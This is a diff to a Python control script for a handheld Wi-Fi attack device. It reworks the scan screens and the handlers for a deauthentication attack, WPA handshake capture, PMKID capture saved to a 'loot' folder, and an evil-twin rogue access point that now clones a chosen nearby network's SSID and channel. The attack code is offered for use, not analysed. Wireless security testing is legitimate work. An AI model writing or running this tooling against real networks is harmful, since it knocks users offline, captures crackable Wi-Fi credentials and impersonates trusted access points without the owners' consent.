@@ -125,18 +125,32 @@ def _pick_iface():
 
 
 def _pick_ap(w, mon_iface):
-    """Scan for APs and let user pick one. Returns AP dict or None."""
-    clear_buf(DRAW)
-    draw_header(DRAW, "SCANNING APs", color=C["ORANGE"])
-    draw_centered(DRAW, "passive scan...", 50, FONT_MENU, fill=C["STEEL"])
-    draw_centered(DRAW, "wait ~15s", 65, FONT_SMALL, fill=C["DIM"])
-    push(LCD, IMAGE)
-
+    """Scan for APs (non-blocking scan loop) and let user pick one."""
     aps = []
     try:
-        scanner = w.WiFiScanner(iface=mon_iface)
-        scanner.start(timeout=15)
-        aps = scanner.get_aps()
+        scanner  = w.WiFiScanner(mon_iface)
+        scanner.start()
+        t_start  = time.time()
+        dots     = 0
+        last_t   = 0.0
+        cancelled = False
+        while time.time() - t_start < 15:
+            dots = (dots + 1) % 4
+            clear_buf(DRAW)
+            draw_header(DRAW, "SCAN APs", color=C["ORANGE"])
+            draw_centered(DRAW, "scanning" + "." * dots, 38, FONT_MENU, fill=C["STEEL"])
+            draw_centered(DRAW, f"{len(scanner.networks)} found", 56, FONT_SMALL, fill=C["GOOD"])
+            draw_status(DRAW, "KEY3: cancel", color=C["DIM"])
+            push(LCD, IMAGE)
+            btn, last_t = read_btn(last_t)
+            if btn in ("KEY3", "LEFT"):
+                cancelled = True
+                break
+            time.sleep(0.5)
+        scanner.stop()
+        if cancelled:
+            return None
+        aps = list(scanner.networks.values())
     except Exception as e:
         log(f"wifi_scan error: {e}")
 
@@ -233,16 +247,27 @@ def op_monitor_mode(w, iface):
 
 def op_wifi_scan(w, mon_iface):
     """Run a passive AP + client scan and display results."""
-    clear_buf(DRAW)
-    draw_header(DRAW, "WIFI SCAN", color=C["ASH"])
-    draw_centered(DRAW, "passive scan...", 50, FONT_MENU, fill=C["STEEL"])
-    push(LCD, IMAGE)
-
     aps = []
     try:
-        scanner = w.WiFiScanner(iface=mon_iface)
-        scanner.start(timeout=20)
-        aps = scanner.get_aps()
+        scanner  = w.WiFiScanner(mon_iface)
+        scanner.start()
+        t_start  = time.time()
+        dots     = 0
+        last_t   = 0.0
+        while time.time() - t_start < 20:
+            dots = (dots + 1) % 4
+            clear_buf(DRAW)
+            draw_header(DRAW, "WIFI SCAN", color=C["ASH"])
+            draw_centered(DRAW, "scanning" + "." * dots, 38, FONT_MENU, fill=C["STEEL"])
+            draw_centered(DRAW, f"{len(scanner.networks)} APs", 56, FONT_SMALL, fill=C["GOOD"])
+            draw_status(DRAW, "KEY3: stop", color=C["DIM"])
+            push(LCD, IMAGE)
+            btn, last_t = read_btn(last_t)
+            if btn in ("KEY3", "LEFT"):
+                break
+            time.sleep(0.5)
+        scanner.stop()
+        aps = list(scanner.networks.values())
         log(f"WIFI_SCAN_DONE aps={len(aps)}")
     except Exception as e:
         log(f"wifi_scan error: {e}")
@@ -342,33 +367,32 @@ def op_deauth(w, mon_iface):
         time.sleep(0.05)
 
     stop = threading.Event()
-    pkts = [0]
+    w.stop_flag.clear()
     try:
-        attack = w.DeauthAttack(iface=mon_iface, bssid=bssid,
-                                client=client, channel=int(channel))
-        t = threading.Thread(target=attack.start, daemon=True)
+        attack = w.DeauthAttack(mon_iface, bssid, client, int(channel))
+        t = threading.Thread(target=attack.attack, daemon=True)
         t.start()
         log(f"DEAUTH_START bssid={bssid} client={client}")
 
         last_t2 = 0.0
         elapsed = 0
         t_start = time.time()
-        while not stop.is_set():
+        while not stop.is_set() and t.is_alive():
             elapsed = int(time.time() - t_start)
-            pkts[0] = getattr(attack, "sent", 0)
+            sent    = getattr(attack, "sent", 0)
             clear_buf(DRAW)
             draw_running(DRAW, "DEAUTH",
-                         line1=bssid[:17], pkt_count=pkts[0], elapsed=elapsed)
+                         line1=bssid[:17], pkt_count=sent, elapsed=elapsed)
             push(LCD, IMAGE)
             btn, last_t2 = read_btn(last_t2)
             if btn in ("KEY3", "LEFT"):
                 stop.set()
             time.sleep(0.15)
 
-        attack.stop()
+        w.stop_flag.set()
         t.join(timeout=3)
-        log(f"DEAUTH_STOP pkts={pkts[0]}")
-        draw_result(DRAW, "DEAUTH DONE", [bssid[:17], f"{pkts[0]} pkts"], color=C["GOOD"])
+        log("DEAUTH_STOP")
+        draw_result(DRAW, "DEAUTH DONE", [bssid[:17], "stopped"], color=C["GOOD"])
     except Exception as e:
         log(f"deauth error: {e}")
         draw_result(DRAW, "DEAUTH ERR", [str(e)[:20]], color=C["BLOOD"])
@@ -388,13 +412,10 @@ def op_handshake(w, mon_iface):
     outfile = os.path.join(loot_dir(), f"handshake_{ssid[:8]}.cap")
 
     stop    = threading.Event()
-    pkts    = [0]
+    w.stop_flag.clear()
     try:
-        cap = w.HandshakeCapture(
-            iface=mon_iface, bssid=bssid,
-            channel=int(channel), output_file=outfile,
-        )
-        t = threading.Thread(target=cap.start, daemon=True)
+        cap = w.HandshakeCapture(mon_iface, bssid, ssid=ssid, channel=int(channel))
+        t = threading.Thread(target=cap.capture, daemon=True)
         t.start()
         log(f"HANDSHAKE_START bssid={bssid}")
 
@@ -402,15 +423,15 @@ def op_handshake(w, mon_iface):
         elapsed = 0
         t_start = time.time()
         captured = False
-        while not stop.is_set():
+        while not stop.is_set() and t.is_alive():
             elapsed   = int(time.time() - t_start)
-            captured  = getattr(cap, "captured", False)
-            pkts[0]   = getattr(cap, "packets", 0)
+            captured  = getattr(cap, "_captured", False)
+            frames    = len(getattr(cap, "_frames", []))
             clear_buf(DRAW)
             draw_running(DRAW, "HANDSHAKE",
                          line1=ssid[:16],
                          line2="CAPTURED!" if captured else "waiting...",
-                         pkt_count=pkts[0], elapsed=elapsed)
+                         pkt_count=frames, elapsed=elapsed)
             push(LCD, IMAGE)
             if captured:
                 time.sleep(1)
@@ -421,7 +442,7 @@ def op_handshake(w, mon_iface):
                 stop.set()
             time.sleep(0.15)
 
-        cap.stop()
+        w.stop_flag.set()
         t.join(timeout=3)
         log(f"HANDSHAKE_STOP captured={captured}")
         color = C["GOOD"] if captured else C["ORANGE"]
@@ -445,14 +466,13 @@ def op_pmkid(w, mon_iface):
 
     bssid   = ap.get("bssid", "")
     ssid    = ap.get("ssid", "target")
-    outfile = os.path.join(loot_dir(), f"pmkid_{ssid[:8]}.txt")
+    channel = ap.get("channel", 1)
     stop    = threading.Event()
+    w.stop_flag.clear()
 
     try:
-        attack = w.PMKIDAttack(
-            iface=mon_iface, bssid=bssid, output_file=outfile
-        )
-        t = threading.Thread(target=attack.start, daemon=True)
+        attack = w.PMKIDAttack(mon_iface, bssid, channel=int(channel))
+        t = threading.Thread(target=attack.attack, daemon=True)
         t.start()
         log(f"PMKID_START bssid={bssid}")
 
@@ -460,9 +480,9 @@ def op_pmkid(w, mon_iface):
         elapsed = 0
         t_start = time.time()
         captured = False
-        while not stop.is_set():
+        while not stop.is_set() and t.is_alive():
             elapsed  = int(time.time() - t_start)
-            captured = getattr(attack, "captured", False)
+            captured = len(getattr(attack, "_pmkids", [])) > 0
             clear_buf(DRAW)
             draw_running(DRAW, "PMKID",
                          line1=ssid[:16],
@@ -478,7 +498,7 @@ def op_pmkid(w, mon_iface):
                 stop.set()
             time.sleep(0.15)
 
-        attack.stop()
+        w.stop_flag.set()
         t.join(timeout=3)
         log(f"PMKID_STOP captured={captured}")
         color = C["GOOD"] if captured else C["ORANGE"]
@@ -493,14 +513,21 @@ def op_pmkid(w, mon_iface):
     wait_for_btn(["KEY3", "LEFT", "OK"])
 
 
-def op_evil_twin(w, iface):
-    """Rogue AP with hostapd + dnsmasq + captive portal."""
-    # Show SSID options: clone a nearby AP or custom
+def op_evil_twin(w, iface, mon_iface):
+    """Rogue AP with hostapd + dnsmasq — clones a selected nearby AP."""
+    # Pick an AP to clone
+    ap_info = _pick_ap(w, mon_iface)
+    if not ap_info:
+        return
+
+    ssid    = ap_info.get("ssid", "FreeWiFi")
+    channel = int(ap_info.get("channel", 6))
+
     clear_buf(DRAW)
     draw_header(DRAW, "EVIL TWIN", color=C["ORANGE"])
-    draw_centered(DRAW, "Clones nearby AP", 28, FONT_SMALL, fill=C["STEEL"])
-    draw_centered(DRAW, "requires hostapd", 40, FONT_SMALL, fill=C["DIM"])
-    draw_centered(DRAW, "& dnsmasq", 52, FONT_SMALL, fill=C["DIM"])
+    draw_centered(DRAW, f"SSID: {ssid[:16]}", 30, FONT_MENU, fill=C["WHITE"])
+    draw_centered(DRAW, f"CH: {channel}", 46, FONT_SMALL, fill=C["STEEL"])
+    draw_centered(DRAW, "needs hostapd", 60, FONT_SMALL, fill=C["DIM"])
     draw_status(DRAW, "OK:START KEY3:BACK", color=C["DIM"])
     push(LCD, IMAGE)
 
@@ -510,7 +537,7 @@ def op_evil_twin(w, iface):
 
     stop = threading.Event()
     try:
-        ap = w.EvilTwinAP(iface=iface)
+        ap = w.EvilTwinAP(iface, ssid, channel=channel)
         t  = threading.Thread(target=ap.start, daemon=True)
         t.start()
         log("EVIL_TWIN_START")
@@ -595,7 +622,8 @@ def main():
                 mon_iface = iface + "mon" if not iface.endswith("mon") else iface
                 op_pmkid(w, mon_iface)
             elif choice == "EVIL TWIN AP":
-                op_evil_twin(w, iface)
+                mon_iface = iface + "mon" if not iface.endswith("mon") else iface
+                op_evil_twin(w, iface, mon_iface)
             elif choice == "< BACK":
                 break
 
